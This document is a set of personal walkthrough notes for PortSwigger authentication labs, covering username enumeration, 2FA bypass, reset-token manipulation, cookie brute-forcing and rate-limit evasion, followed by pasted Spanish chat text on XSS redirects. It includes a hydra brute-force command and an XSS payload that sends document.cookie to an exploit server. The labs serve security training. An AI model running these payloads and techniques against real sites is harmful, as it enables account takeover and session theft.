_________

# Lab: Username enumeration via different responses

- In this exercise we are executing a **Brute force attack** to bypass the **Authentication feature** 

     **Portswiger** provide us with a list of **usernames** and **passwords** to use them in the brute force attack

![[Captura de pantalla 2026-04-12 013133.png]]
    Login panel

- Let's capture the request with **Burpsuite** and send it to **Intruder** 

![[Captura de pantalla 2026-04-12 013319.png]]

- We have to parameters **Username** and **password**, we will make **fuzzing** with the intruder option, let's start with the **Username parameter**.

     For this exercise we will focus on the **lenght parameter** of every request made we need find the different one 

![[Captura de pantalla 2026-04-12 013247.png]]

```
analyzer
```

- We find the Usename **analyzer** with a different parameter, now let's do the same with the **password parameter**

![[Captura de pantalla 2026-04-12 014034.png]]

![[Captura de pantalla 2026-04-12 014117.png]]

- We found the password **daniel** with a different status code. Let's register with the **Username** and **Password** we found 

```
daniel
```

![[Captura de pantalla 2026-04-12 014212.png]]

- There is a second option to execute this **Brute force attack**, we can use **hydra**

```
hydra -L users.txt -P passwords.txt "http-post-form://0a0a006304be744e8008e49a000000e2.web-security-academy.net/login:username=^USER^&password=^PASS^:S=302" -V -t 1
```

![[Captura de pantalla 2026-04-12 172623.png]]

> With hydra can take so long which is not productive for us as pentesters, it can be detected easily by Security filters 


______________
# Lab: 2FA simple bypass

- In this exercise we are facing a **2FA (two-factor authentication)**, we need to use as the user **Carlos** without use the second **Authentication factor**

     2FA (two-factor authentication) is a security method that requires two forms of verification to confirm a user's identity and protect their accounts against unauthorized access.

![[Captura de pantalla 2026-04-12 191026.png]]

- First we log in as our user (**wiener**)

![[Captura de pantalla 2026-04-12 191120.png]]
     System is requesting a **4-digit security code**

- We have the option to check the emailm let;s get the **4-digit security code**

![[Captura de pantalla 2026-04-12 191156.png]]

- Now we can login with our **User** and right here is the key, we will copy the next part of the URL `/my-account`

![[Captura de pantalla 2026-04-12 192852.png]]

- We need to **log-out** and now  **log-in** as **Carlos**, once we are here we need to add `my-account` on the **first authentication factor** (login with password and username) as **Carlos** before provide the **4-digit security code**

![[Captura de pantalla 2026-04-12 194833.png]]

     We delete the /login2 and add the /my-account  

```
https://0afd007d04ed5db48072c6e000b2002a.web-security-academy.net/my-account
```

![[Captura de pantalla 2026-04-12 192544.png]]

- Successfully we bypassed the **second factor authentication** without providing the **4-digit security code**,  system did not verify this second filter it just accepted the link as a user already logged-in.

     Systems sometimes once the **first authentication factor** is accepted assume the user is already logged-in without verify the second factor which is a crutial error for the **Web-site security** 


_________________

# Lab: Password reset broken logic

- In this exercise we leverage of a vague sanitization in the verification of the user's tokens during the resetting password proccess. 

     For this exercise **port swiger** provide us with the username of a user but not the password, besides the credentials of **Wiener** (password includes)

- We have the option reset the password if the case we lose it, let's use the option with the user **Wiener**

![[Captura de pantalla 2026-04-13 155419.png]]

![[Captura de pantalla 2026-04-13 155511.png]]

- We need to access in the **Email-client**

![[Captura de pantalla 2026-04-13 155133.png]]

![[Captura de pantalla 2026-04-13 155215.png]]

- Right here is where we capture the request with **Burpsuite**, we need to change the password of **Wiener** to get the request

![[Captura de pantalla 2026-04-13 154151.png]]

- In this point we can see the system validate the **temp-forgot-password-token** twice and the **username** protocol  is subject to change. let's manipulate this parameters due to as we mentioned before system did not validate the **tokens** properly

     We change the original token for a random one and we change the username for **Carlos**, let's taste it. 

![[Captura de pantalla 2026-04-13 154345.png]]

- **Status code 302 (redirection)**, good for us. system accepted the new password with the user **Carlos**, let's prove it on the login panel.

![[Captura de pantalla 2026-04-13 154506.png]]

> We are proving in this exercise how a poor validation regarding the Token can trigger critical and elevate actions in a website

___________

# Username enumeration via subtly different responses

- In this exercise we will execute a **brute force attack** but unlike of the first exercise in this one we need to filter the error message system give us.

```
Invalid username or password.
```

![[Captura de pantalla 2026-04-13 165833 1.png]]

- We capture the **login request** with **burpsuite**

     Once we capture the **login request** we need to send to the **Intruder**

![[Captura de pantalla 2026-04-13 165634.png]]

- It's important go to the **Grep - Extract** option and remark the **error system message**

```
Invalid username or password.
```

- We are looking for the **unique one**

![[Captura de pantalla 2026-04-13 165714.png]]

     we got the antivirus username identified

- Now we need to discover the **password**, we will let the **username** found and we will select the password parameter.

![[Captura de pantalla 2026-04-13 165544.png]]

- Let's find the **302 status code**

![[Captura de pantalla 2026-04-13 165745.png]]

- We found it, let's login.

![[Captura de pantalla 2026-04-13 165442 1.png]]

- It worked successfully

    >This exercise teach us how to use the information provided by the system against himself (in this case a error message) using it as bait to recognize when the result of a attack is well guided or not.

______________________

# Lab: Username enumeration via response timing

- In this exercise we are facing a **Time validation mechanism** use by **Web-sites** in login process. Basically systems in certain cases only validate the **Password** if the **Username** is valid, if **Username** is not valid system won't go to check the **Password**, this behavior allow us through a request captured (in **burp suite**) analyze the time of the requests which take similar time and that ones takes longer.

      System provide us valid credentials to analyze requests times and also two lists one with Candidates Usernames and Passwords in order to find another valid user

![[Captura de pantalla 2026-04-13 165833 1.png]]
     Login panel

- As security measure some **Web-sites** pay special attention to those repetitives requests which seem suspicious to block them, In this exercise we will face that measure

![[Captura de pantalla 2026-04-15 230342.png]]

- As we expected our I**D has been blocked** after try with multiple requests, let's analyze the request with **Burpsuite**

     In order to **bypass** this **security measure** we will implement/add the **X-Forwarded-For header** which help us to cheat the system regarding the IP where the request come from

![[Captura de pantalla 2026-04-15 231006.png]]

- Despite of System has been cheated using the **X-Forwarded-For header** system only allowed us to send an average of 3-4 request with a **fake IP** which means we need to replace it every 3-4 requests in order to find the valid **User** by fuzzing

     To execute this attack we will make use of the **Intruder tool** in **Burp Suite**. We will use the list of Usernames and Passwords candidates to Fuzz

- First we need to input a really long password to make the system read it completely and capture a significant long computation behind it, which is the signal to know system found a valid user

![[Captura de pantalla 2026-04-17 004348.png]]

- Good, we capture the longest request, let's add this username to the intruder-request and repeat the request with the passwords (For the password request we need to look for a **302 status code**)

![[Captura de pantalla 2026-04-17 004714.png]]

- We got the **302 status code** we expected, we found the **Password** now let's log in.

![[Captura de pantalla 2026-04-17 004000.png]]

- We logged in successfully.

## Key points

## 1
This exercise highlight the importance of a properly sanitization with the **X-Forwarded-For header** which is this case is not validating if the **Fakes IP's**  we are using are **trustworthy**, with a good security measure implemented our requests using **Fakes IP's** will be blocked inmediately 

## 2
We use a process as simple as **the validation time during login** as a guide to determine whether a **username** is valid or not; it’s simple, but as penetration testers, it becomes our eyes

_____
# Lab: Broken brute-force protection, IP block

- In this exercise we are facing a security measure which blocks IP's when multiple request are made consecutively, let's understand this behavior

     System provide us valid credentials as **Wiener** (**Username** and **Password**) and the Username **Carlos** without a Password (We need to exfiltrate it) besides of **Candidates Passwords**

- After studying the **Login panel** behavior we realized system block our **IP** in the third login try, if we login with invalids credentials only twice is ok but at the third time system block our **IP**. however if in the third try we login with the valid credentials system will renew the tries that way we can try multiple times only making sure every third time we need to use the **Wiener** credentials 

![[Captura de pantalla 2026-04-19 001719.png]]

```
You have made too many incorrect login attempts. Please try again in 1 minute(s).
```
      This is the message system give us at the third try 

- Taking into account this behavior we need to make use of the **Intruder feature** of **Burp Suite** to **Fuzz** but first we need to design a specific list with **usernames** and **credentials**

![[Captura de pantalla 2026-04-19 001927.png]]

- Right here we make use of two scripts (in **python**) to create our lists with the order we need

![[Captura de pantalla 2026-04-19 002030.png]]
     Every third time we have the Username **Wiener** to renew the tries 

![[Captura de pantalla 2026-04-19 002303.png]]
      Right here we have the passwords list, **Wiener** password every third time
  
- With this done let's Fuzz with the **Intruder-burpsuite**

     We need to find a **302 status code** coming from the User **Carlos**

![[Captura de pantalla 2026-04-19 015923.png]]

![[Captura de pantalla 2026-04-19 020120.png]]

- We got our valid credentials now let's login.

![[Captura de pantalla 2026-04-19 001454.png]]

- We loged in successfully.

> This exercise teach us how to understand the **Web-site behavior** can be determinant in the **Web-site Security** using it as the key to execute attacks. A login-renew feature is not enough as security measure.

___________

## Brute-forcing a stay-logged-in cookie

- In this exercise we will execute an attack wich consits in understand how a **Remember me** or **Keep me logged in Coeokie**  is build in the **WAF**, understand it will help us as attackers to create or fake our  **keep me logged in cookie**. let's start

    System provide us valid credentials as **Wiener** (**Username** and **Password**) and the Username **Carlos** without a Password (We need to exfiltrate it) besides of **Candidates Passwords**


![[Captura de pantalla 2026-04-20 182941.png]]
     We have allowed the **Stay logged in option**

- We need to capture the **/my-account** request once we logged in as **Wiener** (With **Burpsuite**)

![[Captura de pantalla 2026-04-20 225533.png]]

- We realized a **stay-logged-in cookie** was asigned to us, we need to understand his composition 

     This **Cookie** looks **unusual**, it does not look as a **regular Cookie** let's pass this **Cookie** with the **Decoder feaurure** of **Burpsuite** and see what it is 

![[Captura de pantalla 2026-04-20 231720.png]]

- If we apply a **base64-Encode** we realized the name of the **User Wiener** and more important we have a **MD5** too, we suspect is the password

     To get the **MD5 value** we will use the web site **Crack-station**
     https://crackstation.net/
     Due to legal reasons we need to be carefull about how to use this **Web-site**

![[Captura de pantalla 2026-04-20 232017.png]]

- As we expected we got the **Wiener's password**, we have the hundred porcent of the Cookie composition understood let's use this knowledge to execute the attack with the **Intruder-feature**

     before execute our attack we need to **set-up** how the payload will be taken during it.


![[Captura de pantalla 2026-04-21 000402.png]]

     We will the next configurationss on the Payload processing option
    Hash for our Password
    Prefix to apply the Hash on the correcto position
     Base64 Encode to the whole cookie 
 
![[Captura de pantalla 2026-04-20 232500.png]]

- let's execute our attack

![[Captura de pantalla 2026-04-20 231418.png]]
     **200 status code**

- We have logged in as **Carlos** simply understanding the composition of the **stay-logged-in cookie**

![[Captura de pantalla 2026-04-20 231452.png]]

## Key points

## 1
This simple exercise teach us a how the fact of not **set-up** a non ungueseable **stay-logged-in cookie** (Using a cookie with a complex composition) can compromise the **Web-Site Security** allowing us as attackers to login as other user and much more.

## 2
As attackers is important understant every vulnerability not as **'single-way to attack'** rather as posibility to concatenate multilple vulnerabilities which is more realistic and powerfull as attack, the point with this is realize for example using an **XSS attack** as a bridge we can steal a **stay-logged-in cookie** and study his composition and if this one is vague and easy to undertstand we can **escalate privileges**

___________

# Lab: Offline password cracking

- In this exercise we execute an **Authentication attack** via a **XSS (cross-site-scripting)**, stealing the cookie parameter and studying the composition.

![[Captura de pantalla 2026-04-21 012132.png]]

- We login as **Wiener** ( clicked in **Stay logged in**) and after we capture the **/my-account?** request with **Burpsuite**

![[Captura de pantalla 2026-04-21 012804.png]]

- We got an unusual **stay-logged-in Cookie** (seems to have a base64 encode), we need to steal the **stay-logged-in Cookie** of **Carlos** let's make use of the **exploit sever** provided by Portswiger to execute a **XSS attack** 

     Important: We have the **exploit sever URL** and the **access log** to check the activity 

![[Captura de pantalla 2026-04-21 185213 1.png]]

- Exercise told us the commentaries are vulnerable to **XSS**, let's use a **document.location** to redirect the **Cookie parameter** to our **exploit server** 

![[Captura de pantalla 2026-04-21 184934.png]]

```
<script>document.location='//YOUR-EXPLOIT-SERVER-ID.exploit-server.net/'+document.cookie</script>
```

 - We fill in the commentarie panel and add the **XSS payload** (adding the **exploit sever URL**). Once  this is done we need to check the **Access log** till receive the **Cookie parameter**

![[Captura de pantalla 2026-04-21 013028.png]]

- We got the **Cookie parameter** now we need to extract the **stay-logged-in Cookie** and study the composition.

![[Captura de pantalla 2026-04-21 013113.png]]

- With the decoder feature we realized it's a **base64** and it's showing us the **Username** but we have something else (We suspect it's a **MD5**)

     We will use  https://crackstation.net/ to extract the **MD5** value

![[Captura de pantalla 2026-04-21 013132.png]]

- Successfully we got the **password** of the User ***Carlos*** , let;s use it to login and delete the account

![[Captura de pantalla 2026-04-21 013314.png]]


![[Captura de pantalla 2026-04-21 013358.png]]

- Successfully we logged in as **Carlos** and we have delete the account

![[Captura de pantalla 2026-04-21 013417.png]]

> This exercise shows how an **XSS vulnerability** can be combined with an **authentication attack** and allow attackers to perform critical and unauthorized actions, in addition to a vague sanitization of the **stay-logged-in cookie** that makes it easily readable, implying its forgery and misuse.

_________
# Lab: Password reset poisoning via middleware

- In this exercise we will execute a **Password Reset Poisoning attack** in the **reset-password functionality** which is vulnerable.

     The purpose of this exercise is Login as the user **Carlos** besides Portswiger provide us with the **Wiener** credentials (valid credentials)

![[Captura de pantalla 2026-04-21 232538.png]]

-  Login panel with the **Forgot password?** functionality which is really used in the real life, let's study the behavior using **Burpsuite** to capture the requests we send.

![[Captura de pantalla 2026-04-21 230850 2.png]]
     Request which indicate us to visit the **Wiener email** to receive the an email to reset the password and also which contains the **temp-forgot-password-token** and is use to identified what user will reset the password for only that opportunity, after that this token will be delete it due to security reasons 

![[Captura de pantalla 2026-04-21 233306.png]]
     With this request **Web-site** provide us the panel to reset the password, it's important emphasize we are allowed to manipulate the **temp-forgot-password-token**

![[Captura de pantalla 2026-04-22 000258.png]]


- We will manipulate the **first request** making use of the **header X-Forwarder-Host** which is use to determine the original host requested by the user. We will add as **Original Host** the IP of the **Exploit-server provided by the Portswiger**

> First we will make an example of how this work, we will do it with the User Wiener

![[Captura de pantalla 2026-04-21 231145 2.png]]

- Let's verify the **Exploit-server Email-client** to receive the **reset-password email** 

![[Captura de pantalla 2026-04-21 231027.png]]

- We can observe system accepts the **header X-Forwarded-Host** successfully, we see the **Exploit-server email** we added it. Taking into account this let's execute the attack one more time but this time with the user **Carlos**

![[Captura de pantalla 2026-04-21 233529.png]]

- Let's verify the **Exploit-server Acces-Log** to receive the token we need

![[Pasted image 20260421233637.png]]

```
yisouqmt6nvvrdprciqd0j4jpfgso628
```

- It worked one more time, system accepts the **header X-Forwarded-Host** and now we have the 
**Carlos temp-forgot-password-token** let's use it to login

![[Captura de pantalla 2026-04-21 231930 1.png]]

![[Captura de pantalla 2026-04-21 232234.png]]

- We input the new password

![[Captura de pantalla 2026-04-21 232312.png]]

- We logged in successfully as the **User Carlos**

## Key points

## 1 
This exercise teach us how a vague sanitization in the headers and to be specific the use of the **header X-Forwarded-Host** can concatenate dangerous and unathorized actions which infringe **Web-site security**

## 2
Exercise description says **'The user `carlos` will carelessly click on any links in emails that he receives'** and this can be defined as the biggest mistake a **Web-site** can has:

    THE HUMAN FACTOR

The fact that any employee in a company trust in a link which does not know, involves and create the perfect scenario for one pentester to infringe the **Website Security** performing vulnerabilities as ***CSRF, BAC, XXS*** etc...


______________
# Lab: Password brute-force via password change

- In this exercise we will leverage of the Web-site messages to gain access as the **User Carlos** robbing his password

     Essentially we will use the Web-Site messages as guide to determine which password is correct.

- **Portswiger** provide us a **Candidate password list** to execute our attack and the **Wiener valid credentials**

![[Captura de pantalla 2026-04-22 190019.png]]

- We have the panel to **Update email** and **Change password**, let's study the **Change password** behavior

![[Captura de pantalla 2026-04-22 190617.png]]

      Wrong current password + two different new passwords



![[Captura de pantalla 2026-04-22 190159.png]]

     valid current password + two different new passwords

- Studying this behavior we realize if we enter the **valid password** plus **two different new passwords** system will indicate us the **two different new passwords** assuming the current password is correct which give us an important clue, if we can execute a **Fuzzing attack** and grep in every response the message **New passwords do not match** that way we will find the correct password.

     We capture the request with **Burpsuite** and we will use the **Intruder feature** 

![[Captura de pantalla 2026-04-22 190827.png]]

- We change the **username** by **carlos** and after we will select the **current-password parameter** besides we need to use the **Grep match** option to capture the **New passwords do not match**

![[Captura de pantalla 2026-04-22 191816.png]]

- Let's execute the attack.

![[Captura de pantalla 2026-04-22 192038.png]]

- We have capture two important indicators, a different **Length** and the message we are looking for **New passwords do not match**. The password is **ranger** let's login as **Carlos** 

![[Captura de pantalla 2026-04-22 192201.png]]

- We logged in successfully as the user **Carlos**

## Key points

## 1
This exercise show how to execute a **Information Exposure through Discrepancy in Responser** attack, a simple way to understand it is how the error in the order as the parameters are read can filter crutial information.

     If the system has validated the current password first before the two different new passwords could have reported a different error without mention the validation of the current password


____________

# Lab: Broken brute-force protection, multiple credentials per request

- In this exercise we are facing a vulnerability located in a **JSON format** which is use to handle the credentials on the login panel

     This exercise only provide us a **valid username** and a list of **candidate passwords**

![[Captura de pantalla 2026-04-26 210108.png]]
     Login request captured in **Burpsuite**

-   We will manipulate the **JSON format** adding more passwords and check if the system accepts multiple values

![[Captura de pantalla 2026-04-26 210818.png]]

![[Captura de pantalla 2026-04-26 210847.png]]

- We have a **200 status code**, good for us. System is reading every password we entered that means we can try with all the **candidate passwords** and in some point system fwill find the correct password.

      We will use nvim to adapt the passwords format

```
"password":[
   "123456",
   "password",
   etc...
]
```

![[Captura de pantalla 2026-04-26 211006.png]]

![[Captura de pantalla 2026-04-26 211039.png]]

- **302 status code (redirection)** which means system find the valid password, let's to my /my-account? as **Carlos** 

![[Captura de pantalla 2026-04-26 212302.png]]

## Key points

## 1
In this exercise, we are executing a brute-force attack targeting a JSON-based login panel that fails to enforce strict schema validation. While the system should only accept a single string value per parameter, the backend incorrectly processes an **array** of multiple passwords within a **single HTTP request**. This logic flaw allow us to bypass traditional rate-limiting protections and send all candidate passwords at once until the server identifies a valid credential and returns a 302 redirect.

___________________
























```
|   |
|---|
|onceuponatime|
```






En un ataque **XSS (Cross-Site Scripting)**, el uso de **`document.location`** (o sus propiedades como `document.location.href`, `document.location.assign()`, `document.location.replace()`, etc.) permite al atacante **redirigir a la víctima a otra página web**, generalmente maliciosa. Aquí te explico cómo funciona y qué riesgos implica:

---

### **¿Qué hace `document.location` en un ataque XSS?**

- **Redirección forzada:** El atacante puede cambiar la URL actual del navegador de la víctima, enviándola a un sitio controlado por él.
- **Ejemplo de código malicioso:**
    
    javascript
    
    Copiar
    
    ```
    document.location = "https://sitio-malicioso.com/robar-datos";
    ```
    
    o
    
    javascript
    
    Copiar
    
    ```
    document.location.href = "https://sitio-malicioso.com/phishing";
    ```
    
- **Objetivo:** Robar credenciales, instalar malware, realizar phishing, o ejecutar otros ataques.

---

### **¿Por qué es peligroso?**

- **Pérdida de control:** La víctima no espera ser redirigida y puede ingresar información sensible en el sitio falso.
- **Bypass de seguridad:** Si el sitio malicioso parece legítimo (ej: un clon de un banco), la víctima puede caer en el engaño.
- **Combinación con otros ataques:** Puede usarse junto con `document.cookie` para robar sesiones o tokens de autenticación.

---

### **¿Cómo se mitiga?**

- **Validar y sanitizar entradas de usuario** (evitar que se inyecte JavaScript).
- **Usar Content Security Policy (CSP)** para restringir la ejecución de scripts no autorizados.
- **Educar a los usuarios** sobre los riesgos de hacer clic en enlaces sospechosos.






¡Buena observación! **Sí y no.** Aunque tanto `document.location` como el atributo `href` en HTML pueden redirigir a una página, hay diferencias clave en su comportamiento y contexto de uso, especialmente en un ataque XSS:

---

### **1. `href` en HTML (enlace normal)**

- **Uso legítimo:** Se usa en etiquetas `<a>` para crear enlaces.
    
    html
    
    Copiar
    
    ```
    <a href="https://ejemplo.com">Haz clic aquí</a>
    ```
    
- **Comportamiento:** La redirección solo ocurre si el usuario **hace clic** en el enlace.
- **En XSS:** Si un atacante logra inyectar un `<a href="...">`, la víctima debe interactuar (hacer clic) para ser redirigida.

---

### **2. `document.location` en JavaScript**

- **Uso malicioso:** Se ejecuta automáticamente si el código JavaScript se inyecta en la página.
    
    javascript
    
    Copiar
    
    ```
    document.location = "https://sitio-malicioso.com";
    ```
    
- **Comportamiento:** La redirección ocurre **inmediatamente**, sin necesidad de interacción del usuario.
- **En XSS:** Si el atacante inyecta este código (por ejemplo, a través de un comentario o campo de entrada no sanitizado), la víctima es redirigida al instante al cargar la página.

---

### **Diferencia clave en XSS**

|href en HTML|document.location en JavaScript|
|---|---|
|Requiere clic del usuario|Se ejecuta automáticamente|
|Menos peligroso en XSS|Más peligroso en XSS|
|Ejemplo:`[](...)`|Ejemplo:|

---

### **¿Por qué es más peligroso `document.location` en XSS?**

- **No requiere interacción:** La víctima no necesita hacer nada; la redirección ocurre al cargar la página.
- **Puede combinarse con otros ataques:** Por ejemplo, robar cookies antes de redirigir.

---

¿Quieres un ejemplo de cómo se inyectaría este código en una vulnerabilidad real o cómo detectarlo?